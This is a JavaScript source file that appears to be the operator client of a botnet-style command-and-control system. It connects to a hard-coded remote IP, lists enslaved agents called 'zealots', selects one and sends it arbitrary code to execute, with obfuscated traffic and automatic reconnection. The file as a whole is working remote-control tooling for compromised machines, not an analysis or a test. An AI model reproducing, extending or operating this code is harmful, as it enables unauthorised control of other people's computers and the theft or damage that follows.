'use strict'

const ASSIMILATOR_PORT = 9027
const ASSIMILATOR_HOST = '52.38.225.69'
const COMMANDS = ['ls', 'info', 'use', 'exec', 'quit']

const socket = require('net').Socket()
const readline = require('readline')
const getMac = require('getmac').getMac
const obfuscator = require('../obfuscator')
var o

getMac((err, mac) => {
  const archonID = `A-${(mac || require('node-uuid').v4())}`
  const argv = process.argv.splice(2)
  const host = argv.length ? argv[0] : ASSIMILATOR_HOST

  const state = {
    waiting: false,
    execMode: false,
    execBuffer: '',
    zealotID: null,
    lineBuffer: []
  }

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    completer: (line) => {
      if (state.execMode) {
        return [[], line]
      } else {
        var hits = COMMANDS.filter((c) => c.indexOf(line) == 0)
        return [hits.length ? hits : COMMANDS, line]
      }
    }
  })

  function sendMessage(msg, callback) {
    state.waiting = true
    msg.archonID = archonID
    o.e(msg, data => {
      socket.write(data, error => {
        state.waiting = false
        if (error) {
          console.error(error)
        }
        void(callback && callback(error))
      })
    })
  }

  rl.setPrompt('> ')
  rl.on('line', line => {
    state.lineBuffer.push(line)
    if (!state.waiting) {
      processLine()
    }
  })

  function processLine() {

    if (!state.lineBuffer.length) {
      // out of input
      return
    }

    let line = state.lineBuffer.splice(0,1)[0]

    if (!line.trim()) {
      commandLoop()
      return
    }

    if (state.execMode) {
      if (line.trim() == 'EOF') {
        // send data
        // wait for response
        var exec = state.execBuffer.trim()
        let postExec = () => {
          state.execMode = false
          rl.setPrompt('> ')
          state.execBuffer = ''
          commandLoop()
        }
        if (!exec) {
          postExec()
        } else {
          sendMessage({cmd: 'exec', arg: exec, zealotID: state.zealotID}, postExec)
        }
      } else {
        state.execBuffer += line + '\n'
      }
    } else {
      var args = line.split(/[ \t]+/)
      var cmd = args[0]
      var arg = line.substr(cmd.length).trim()
      switch (cmd) {
        case 'ls':
          // do ls
          sendMessage({cmd: 'ls', arg: arg})
          break
        case 'use':
        case 'info':
          // do use
          if (!arg) {
            console.log('error: please specify a zealot')
            commandLoop()
          } else {
            sendMessage({cmd: cmd, arg: arg})
          }
          break
        case 'exec':
          // do exec
          if (!state.zealotID) {
            console.error(`error: no zealot selected`)
            commandLoop()
          } else {
            state.execMode = true
            state.execBuffer = arg
            console.log('<<EOF')
            console.log(state.execBuffer)
            rl.setPrompt('')
          }
          break
        case 'quit':
          // quit
          console.log('Goodbye\n')
          socket.end()
          rl.close()
          break
        default:
          console.log(`unknown action: '${cmd}'`)
          commandLoop()
          break
      }
    }
  }

  socket.on('data', (data) => {
    o.d(data, msg => {
      if (msg.error) {
        console.error(msg.error)
      } else {
        switch (msg.cmd) {
          case 'ls':
            let fmt = (s, n) => {
              if (!s) s = ' '
              else if (typeof s != 'string') s = s.toString() + ' '
              while (s.length < n)
                s += ' '
              return s
            }

            let timeDiff = (d) => {
              if (d) {
                let diff = Date.now() - new Date(d).getTime()
                let units = [
                  { val: 1,    name: 'ms'},
                  { val: 1000, name: 's' },
                  { val: 60,   name: 'm' },
                  { val: 60,   name: 'h' },
                  { val: 24,   name: 'd' },
                  { val: 365,  name: 'y' }
                ]
                let uName = 'ms'
                units.find(unit => {
                  if (diff / unit.val < 1)
                    return true
                  diff /= unit.val
                  uName = unit.name
                })
                return `${diff}`.replace(/(\...).*/, '$1') + uName
              } else {
                return '-'
              }
            }
            console.log(
              fmt('name', 16) +
              fmt('state', 10) +
              fmt('connected', 16) +
              fmt('disconnected', 16) +
              fmt('checked in', 16))

            msg.zealots.forEach(zealot => {

              console.log(
                fmt(zealot.name, 16) +
                fmt(zealot.state, 10) +
                fmt(timeDiff(zealot.connected), 16) +
                fmt(timeDiff(zealot.disconnected), 16) +
                fmt(timeDiff(zealot.lastCheckIn), 16))
            })
            console.log()
            break
          case 'info':
            if (msg.zealot) {
              console.log(msg.zealot)
              console.log()
            } else {
              console.log(`Not found`)
            }
            break
          case 'use':
            state.zealotID = msg.zealotID
            console.log(`switched to zealot ${msg.name}`)
            break
          case 'print':
            console.log(`"${msg.name}" - ${msg.kind}:`)
            console.log(msg.data)
            break
          case 'eof':
            // noop
            break
          default:
            console.log(`error - invalid message from assimilator: ${JSON.stringify(msg)}`)
            break
        }
      }
      commandLoop()
    })
  })

  function commandLoop() {
    void(state.lineBuffer.length ? processLine() : rl.prompt())
  }

  var connectDelay = 100

  socket.on('connect', () => {
    connectDelay = 100
    o = obfuscator.create()
    commandLoop()
  })

  socket.connect({
    host: host,
    port: ASSIMILATOR_PORT
  })

  socket.on('error', (error) => {
    console.log(error)

    // exponential retry
    if (connectDelay < 10000)
      connectDelay *= 1.5

    setTimeout(() => {
      console.log('Reconnecting')
      socket.connect({host: host, port: ASSIMILATOR_PORT})
    }, connectDelay)
  })
})
